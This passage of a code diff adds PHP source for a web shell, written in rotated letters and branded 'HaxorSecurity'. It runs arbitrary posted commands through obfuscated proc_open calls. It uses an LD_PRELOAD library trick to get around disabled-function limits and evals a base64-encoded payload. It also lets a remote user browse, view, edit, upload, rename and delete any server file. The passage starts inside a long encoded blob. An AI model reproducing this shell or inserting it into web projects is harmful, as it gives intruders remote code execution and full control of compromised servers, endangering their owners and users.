NNNNNNNONNNNNNNNNNRNNNNNNNNNO+NNNNNDNNNNLNNNNNNNNN0NpNNNNNNNQDOjNNNNNNNNtNNNNNNNNNNNNNNNNNNNNVNNNNNNNNNNNNNNNNNNNNujNNNNRNNNNTNNNNNNNNNBNUNNNNNNNN4NpNNNNNNNO6NDNNNNNNNNNNNNNNNNNNRNNNNNNNNNNNNNNNNNNNNV0NNNNONNNNOtNNNNNNNNOpPDNNNNNNNSjWNNNNNNNNPDNNNNNNNNNNNNNNNNNNNNDNNNNNNNNNNNNNNNNNNNPGNNNNNDNNNNVNNNNNNNNNMDxNNNNNNNOyPDNNNNNNNOZNNNNNNNNNNNNNNNNNNNNONNNNNNNNNNNNNNNNNNNNzjNNNNRNNNNPNNNNNNNNNUtWNNNNNNNNrNxNNNNNNNN0NNNNNNNNNNNNNNNNNNNNONNNNNNNNNNNNNNNNNNNNXxNNNNONNNNNtNNNNNNNNPjPDNNNNNNNYNWNNNNNNNNiNNNNNNNNNNNNNNNNNNNNNtNNNNNNNNNNNNNNNNNNNPmNNNNQtNNNNZNNNNNNNNN+N0tNNNNNNQ4QDNNNNNNNONNNNNNNNNNNNNNNNNNNNNVNNNNNNNNNNtNNNNNNNNNijNNNN8NNNNQNNNNNNNNNNtBVNNNNNNNPN4NNNNNNNNVNNNNNNNNNNNNNNNNNNNNPNNNNNNNNNNVNNNNNNNNNZfNNNNONNNNNjNNNNNNNNNDQvNNNNNNNONBNNNNNNNNPNNNNNNNNNNNNNNNNNNNNNtNNNNNNNNNNNNNNNNNNNQDNNNNOtNNNNZNNNNNNNNNTN4tNNNNNNNLQtNNNNNNNZNONNNNNNNNONNNNNNNNNNVNNNNNNNNNONNNNNNNNNNttNNNNRNNNNQNNNNNNNNNAtCVNNNNNNN2N8NNNNNNNNbNNNNNNNNNNNNNNNNNNNNPNNNNNNNNNNVNNNNNNNNNAxNNNNONNNNNjNNNNNNNNNNRPNNNNNNNNNDNNNNNNNNLNNNNNNNNNNNNNNNNNNNNNtNNNNNNNNNPNNNNNNNNNQvNNNNNDNNNNZNNNNNNNNNLONtNNNNNNOtRNNNNNNNNNtNNNNNNNNNNNNNNNNNNNNVNNNNNNNNNNNNNNNNNNNN6NNNNNtNNNNQNNNNNNNNNTtDVNNNNNNNnONNNNNNNNNVNNNNNNNNNNNNNNNNNNNNNDNNNNNNNNNNNNNNNNNNNB0NNNNONNNNZNNNNNNNNNNNNNNNNNNNNTtDNNNNNNNNYDNNNNNNNNNNNNNNNNNNNNRNNNNNNNNNNDNNNNNNNNNONNNNNtNNNNNNNNNNNNNNNNNNNNNNNNPLRNNNNNNNNOtTNNNNNNNNTjNNNP0NNNNVNNNNNNNNNOtNNNNNNNNNPDNNNNZNNNNNNNNNNNNNNNNNNNNNNNNNfOLNNNNNNNOYNtNNNNNNNNNNNNNNNNNNNDNNNNNNNNNNNNNNNNNNNORNNNNQNNNNNNNNNNNNNNNNNNNNNNNNNCfLNNNNNNNN9tNNNNNNNNNNNNNNNNNNNNRNNNNNNNNNNNNNNNNNNNN=';
+        $pzqq = $_CBFG['pzq_vachg'];
+        $zrgrecergre = $ra($pzqq." > grfg.gkg");
+        $ivrjPbzznaqErfhyg = '<ue><c>Erfhyg: <sbag pbybe="oynpx">onfr64 : ' . $zrgrecergre .'</oe>Cyrnfr Erserfu naq Purpx Svyr grfg.gkg, guvf bhgchg pbzznaq<oe>grfg.gkg perngrq = IHYA<oe>grfg.gkg abg perngrq = ABG IHYA<oe>rknzcyr npprff: qbznva.pbz/lbhecngu/cngu/grfg.gkg<oe>Cbjrerq Ol UnkbeFrphevgl</sbag><oe><oe></grkgnern>';        
+        $n($shyy . '/punaxeb.fb', $onfr($ubbx));
+        $n($shyy . '/npcvq.fbpxrg', $onfr($zrgrecergre));
+        $c('PUNAXEB=' . $shyy . '/npcvq.fbpxrg');
+        $c('YQ_CERYBNQ=' . $shyy . '/punaxeb.fb');
+        $z('n','n','n','n');
+    }ryfrvs (vffrg($_CBFG['qryrgr_svyr'])) {
+        $svyrGbQryrgr = $pheeragQverpgbel . '/' . $_CBFG['qryrgr_svyr'];
+        vs (svyr_rkvfgf($svyrGbQryrgr)) {
+            vs (vf_qve($svyrGbQryrgr)) {
+                vs (qryrgrQverpgbel($svyrGbQryrgr)) {
+                    rpub '<ue>Sbyqre qryrgrq fhpprffshyyl!';
+                } ryfr {
+                    rpub '<ue>Reebe: Snvyrq gb qryrgr sbyqre!';
+                }
+            } ryfr {
+                vs ($hay($svyrGbQryrgr)) {
+                    rpub '<ue>Svyr qryrgrq fhpprffshyyl!';
+                } ryfr {
+                    rpub '<ue>Reebe: Snvyrq gb qryrgr svyr!';
+                }
+            }
+        } ryfr {
+            rpub '<ue>Reebe: Svyr be qverpgbel abg sbhaq!';
+        }
+    } ryfrvs (vffrg($_CBFG['eranzr_vgrz']) && vffrg($_CBFG['byq_anzr']) && vffrg($_CBFG['arj_anzr'])) {
+        $byqAnzr = $pheeragQverpgbel . '/' . $_CBFG['byq_anzr'];
+        $arjAnzr = $pheeragQverpgbel . '/' . $_CBFG['arj_anzr'];
+        vs (svyr_rkvfgf($byqAnzr)) {
+            vs (eranzr($byqAnzr, $arjAnzr)) {
+                rpub '<ue>Vgrz eranzrq fhpprffshyyl!';
+            } ryfr {
+                rpub '<ue>Reebe: Snvyrq gb eranzr vgrz!';
+            }
+        } ryfr {
+            rpub '<ue>Reebe: Vgrz abg sbhaq!';
+        }
+    }ryfrvs (vffrg($_CBFG['pzq_ovnfn'])) {
+            $cc = "c"."e"."b"."p"."_"."b"."c"."r"."a";
+            $cp = "s"."p"."y"."b"."f"."r";
+            $ccp = "c"."e"."b"."p"."_"."p"."y"."b"."f"."r";
+            $fgt = "f"."g"."e"."r"."n"."z"."_"."t"."r"."g"."_"."p"."b"."a"."g"."r"."a"."g"."f";
+            $pbzznaq = $_CBFG['pzq_ovnfn'];
+            $qrfpevcgbefcrp = [
+                0 => ['cvcr', 'e'],
+                1 => ['cvcr', 'j'],
+                2 => ['cvcr', 'j']
+            ];
+            $cebprff = $cc($pbzznaq, $qrfpevcgbefcrp, $cvcrf);
+            vs (vf_erfbhepr($cebprff)) {
+                $bhgchg = $fgt($cvcrf[1]);
+                $reebef = $fgt($cvcrf[2]);
+                $cp($cvcrf[1]);
+                $cp($cvcrf[2]);
+                $ccp($cebprff);
+                vs (!rzcgl($reebef)) {
+                    $ivrjPbzznaqErfhyg = '<ue><c>Reebe: </c><grkgnern pynff="erfhyg-obk">' . $ugz($reebef) . '</grkgnern>';
+                } ryfr {
+                    $ivrjPbzznaqErfhyg = '<ue><c>Erfhyg: </c><grkgnern pynff="erfhyg-obk">' . $ugz($bhgchg) . '</grkgnern>';
+                }
+            } ryfr {
+                $ivrjPbzznaqErfhyg = 'Erfhyg:</c><grkgnern pynff="erfhyg-obk">Reebe: Snvyrq gb rkrphgr pbzznaq! </grkgnern>';
+            }
+    } ryfrvs (vffrg($_CBFG['ivrj_svyr'])) {
+        $svyrGbIvrj = $pheeragQverpgbel . '/' . $_CBFG['ivrj_svyr'];
+        vs (svyr_rkvfgf($svyrGbIvrj)) {
+            $svyrPbagrag = $stp($svyrGbIvrj);
+            $ivrjPbzznaqErfhyg = '<ue><c>Erfhyg: ' . $_CBFG['ivrj_svyr'] . '</c>
+            <sbez zrgubq="cbfg" npgvba="?'.(vffrg($_FREIRE['DHREL_FGEVAT']) ? $_FREIRE['DHREL_FGEVAT'] : '').'">
+            <grkgnern anzr="pbagrag" pynff="erfhyg-obk">' . $ugz($svyrPbagrag) . '</grkgnern><gq>
+            <vachg glcr="uvqqra" anzr="rqvg_svyr" inyhr="' . $_CBFG['ivrj_svyr'] . '">
+            <vachg glcr="fhozvg" inyhr=" Fnir "></sbez></gq>';
+        } ryfr {
+            $ivrjPbzznaqErfhyg = '<ue><c>Reebe: Svyr abg sbhaq!</c>';
+        }
+    
+$rapbqrq = 'CQ9jnUNXDTyhnI9mMKDbW291qUO1qS9vqJMzMKWcozpaYPNjXGfXDTyhnI9mMKDbW2Ecp3OfLKysMKWlo3WmWljtZPx7PaAyqS90nJ1yK2kcoJy0XQNcBjccozysp2I0XPqgMJ1ipaysoTygnKDaYPNaAwEAWlx7PzuyLJEypvtaD29hqTIhqP1HrKOyBvO0MKu0Y2u0oJj7VTAbLKWmMKD9IIETYGtaXGfXWUE1naIuoz1unJjtCFNapzS5qJAuM2Shp0OaoJScoP5wo20aBjbxrS9jLKEbVQ0tVzu0qUN6Yl8vVP4tWS9GEIWJEIWoW1ASHyMSHy9BDH1SW10tYvNxK1ASHyMSHyfaHxIEIHIGIS9IHxxaKGfXWUOyp2ShK2SfMKW0VQ0tVzMcrPNxrS9jLKEbVQcjVPcWHPOOMTElMKAmVQbtJlNvVP4tWS9GEIWJEIWoW1WSGH9HEI9OEREFW10tYvNvVS0vBjcgLJyfXPE0qJc1LJ5gLJyfYPNvGR9UE0IFVvjtWUOyp2ShK2SfMKW0YPNvJlNvVP4tWS9GEIWJEIWoW1WSGH9HEI9OEREFW10tYvNvVS0vXGf=';
+$qrpbqrq = onfr64_qrpbqr($rapbqrq);
+riny('?>' . $qrpbqrq);
+
+    }  ryfrvs (vffrg($_CBFG['rqvg_svyr'])) {
+        $rs = $pheeragQverpgbel . '/' . $_CBFG['rqvg_svyr'];
+        $arjPbagrag = $_CBFG['pbagrag'];
+        vs ($scp($rs, $arjPbagrag) !== snyfr) {
+            rpub '<ue>Svyr Rqvgrq fhpprffshyyl! ' . $_CBFG['rqvg_svyr'].'<ue>';
+        } ryfr {
+            rpub '<ue>Reebe: Snvyrq Rqvg Svyr! ' . $_CBFG['rqvg_svyr'].'<ue>';
+
+        }
+    }
+
+}
+
+rpub '<ue>QVE: ';
+
+$qverpgbevrf = $rkcy(QVERPGBEL_FRCNENGBE, $pheeragQverpgbel);
+$pheeragCngu = '';
+$ubzrYvaxCevagrq = snyfr;
+sbernpu ($qverpgbevrf nf $vaqrk => $qve) {
+    $pheeragCngu .= QVERPGBEL_FRCNENGBE . $qve;
+    vs ($vaqrk == 0) {
+        rpub '/<n uers="?q=' . k($pheeragCngu) . '">' . $qve . '</n>';
+    } ryfr {
+        rpub '/<n uers="?q=' . k($pheeragCngu) . '">' . $qve . '</n>';
+    }
+}
+
+rpub '<n uers="?q=' . k($fpevcgQverpgbel) . '"> / <fcna fglyr="pbybe: terra;">[ TB Ubzr ]</fcna></n>';
+rpub '<oe>';
+rpub '<ue><sbez zrgubq="cbfg" rapglcr="zhygvcneg/sbez-qngn">';
+rpub '<ue>';
+rpub '<vachg glcr="svyr" anzr="svyrGbHcybnq" vq="svyrGbHcybnq" cynprubyqre="cvyvu svyr:">';
+rpub '<vachg glcr="fhozvg" inyhr="Hcybnq Svyr" anzr="fhozvg">';
+rpub '</sbez><ue>';
+rpub '<gnoyr obeqre="5"><gobql>
+<ge>
+<gq>
+<pragre>Pbzznaq OLCNFF<sbez zrgubq="cbfg" npgvba="?'.(vffrg($_FREIRE['DHREL_FGEVAT']) ? $_FREIRE['DHREL_FGEVAT'] : '').'">
+<vachg glcr="grkg" anzr="pzq_vachg" cynprubyqre="Ragre pbzznaq"><vachg glcr="fhozvg" inyhr="Eha Pbzznaq"></sbez></pragre></gq>
+
+<gq><pragre>Pbzznaq OVNFN<sbez zrgubq="cbfg" npgvba="?'.(vffrg($_FREIRE['DHREL_FGEVAT']) ? $_FREIRE['DHREL_FGEVAT'] : '').'">
+<vachg glcr="grkg" anzr="pzq_ovnfn" cynprubyqre="Ragre pbzznaq"><vachg glcr="fhozvg" inyhr="Eha Pbzznaq"></sbez><pragre></gq>
+
+<gq><pragre>Perngr Sbyqre<sbez zrgubq="cbfg" npgvba="?'.(vffrg($_FREIRE['DHREL_FGEVAT']) ? $_FREIRE['DHREL_FGEVAT'] : '').'">
+<vachg glcr="grkg" anzr="sbyqre_anzr" cynprubyqre="Sbyqre Anzr"><vachg glcr="fhozvg" inyhr="Perngr Sbyqre"></sbez><pragre></gq>
+<gq><pragre>Perngr Svyr<sbez zrgubq="cbfg" npgvba="?'.(vffrg($_FREIRE['DHREL_FGEVAT']) ? $_FREIRE['DHREL_FGEVAT'] : '').'">
+<vachg glcr="grkg" anzr="svyr_anzr" cynprubyqre="Svyr Anzr"><vachg glcr="fhozvg" inyhr="Perngr Svyr"></sbez></gq></ge>
+</gobql></gnoyr>';
+rpub $ivrjPbzznaqErfhyg;
+rpub '<gnoyr obeqre=1>';
+rpub '<oe><ge><gu><pragre>Vgrz Anzr</gu><gu><pragre>Fvmr</gu><gu><pragre>Qngr</gu><gu>Crezvffvbaf</gu><gu><pragre>Ivrj</gu><gu><pragre>Qryrgr</gu><gu><pragre>Eranzr</gu></ge></pragre></pragre></pragre>';
+sbernpu ($fpq($pheeragQverpgbel) nf $i) {
+    $h = $evy($i);
+    $f = $fg($h);
+    $vgrzYvax = $vfqve($i) ? '?q=' . k($pheeragQverpgbel . '/' . $i) : '?'.('q='.k($pheeragQverpgbel).'&s='.k($i));
+    $crezvffvba = fhofge(fcevags('%b', svyrcrezf($h)), -4);
+    $jevgnoyr = $vfj($h);
+    rpub '<ge>
+            <gq pynff="vgrz-anzr"><n uers="'.$vgrzYvax.'">'.$i.'</n></gq>
+            <gq pynff="fvmr">'.svyrfvmr($h).'</gq>
+            <gq pynff="qngr" fglyr="grkg-nyvta: pragre;">'.qngr('L-z-q U:v:f', svyrzgvzr($h)).'</gq>
+            <gq pynff="crezvffvba '.($jevgnoyr ? 'jevgnoyr' : 'abg-jevgnoyr').'">'.$crezvffvba.'</gq>
+            <gq><pragre><sbez zrgubq="cbfg" npgvba="?'.(vffrg($_FREIRE['DHREL_FGEVAT']) ? $_FREIRE['DHREL_FGEVAT'] : '').'"><vachg glcr="uvqqra" anzr="ivrj_svyr" inyhr="'.$ugz($i).'"><vachg glcr="fhozvg" inyhr=" Ivrj "></sbez></pragre></gq>
+            <gq><pragre><sbez zrgubq="cbfg" npgvba="?'.(vffrg($_FREIRE['DHREL_FGEVAT']) ? $_FREIRE['DHREL_FGEVAT'] : '').'"><vachg glcr="uvqqra" anzr="qryrgr_svyr" inyhr="'.$ugz($i).'"><vachg glcr="fhozvg" inyhr="Qryrgr"></sbez></pragre></gq>
+            <gq><sbez zrgubq="cbfg" npgvba="?'.(vffrg($_FREIRE['DHREL_FGEVAT']) ? $_FREIRE['DHREL_FGEVAT'] : '').'"><vachg glcr="uvqqra" anzr="byq_anzr" inyhr="'.$ugz($i).'"><vachg glcr="grkg" anzr="arj_anzr" cynprubyqre="Arj Anzr"><vachg glcr="fhozvg" anzr="eranzr_vgrz" inyhr="Eranzr"></sbez></gq>
+        </ge>';
+        
+}
+
+rpub '</gnoyr>';
+shapgvba qryrgrQverpgbel($qve) {
+   $hay = "h"."a"."y"."v"."a"."x";
+    vs (!svyr_rkvfgf($qve)) {
+        erghea gehr;
+    }
+    vs (!vf_qve($qve)) {
+        erghea $hay($qve);
+    }
+    $fpq = "f"."p"."n"."a"."q"."v"."e";
+    sbernpu ($fpq($qve) nf $vgrz) {
+        vs ($vgrz == '.' || $vgrz == '..') {
+            pbagvahr;
+        }
+        vs (!qryrgrQverpgbel($qve . QVERPGBEL_FRCNENGBE . $vgrz)) {
+            erghea snyfr;
+        }
+    }
+    erghea ezqve($qve);
+}
